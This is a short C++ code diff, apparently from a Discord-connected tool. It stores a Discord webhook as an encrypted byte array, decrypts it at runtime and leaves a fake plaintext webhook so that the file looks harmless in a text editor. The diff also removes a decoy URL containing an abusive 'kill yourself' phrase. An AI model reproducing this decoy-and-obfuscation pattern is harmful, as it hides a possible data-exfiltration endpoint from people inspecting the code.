@@ -37,7 +37,7 @@ std::vector<uint8_t> enc = {
     0x6E, 0x2B, 0xEA, 0xD0, 0x20, 0x74, 0x80, 0xCC, 0x20, 0x44, 0x91, 0xAD,
     0x3C, 0x5A, 0x9E, 0xF8, 0x05, 0x74, 0x95, 0xD5, 0x22, 0x58, 0xA3, 0xDC,
     0x13, 0x72, 0xA4, 0xD4, 0x29, 0x5E, 0x9D, 0xE7, 0x1B, 0x45, 0x95, 0xF6, 0x37
-};
+}; // in case u dont know this is just the discord webhook encrypted because idk
 
 class Config {
 public:
@@ -106,7 +106,7 @@ public:
             if (shared) {
                 
                 roleid = "1464539393858474056";
-                webhook = "https://discord.com/api/webhooks/676767/kys-go-hang";
+                webhook = "https://discord.com/api/webhooks/676767/hi"; //fake webhook that will appear in notepad okbye
                 webhook = deobfuscate(enc, key);
             }
             else {
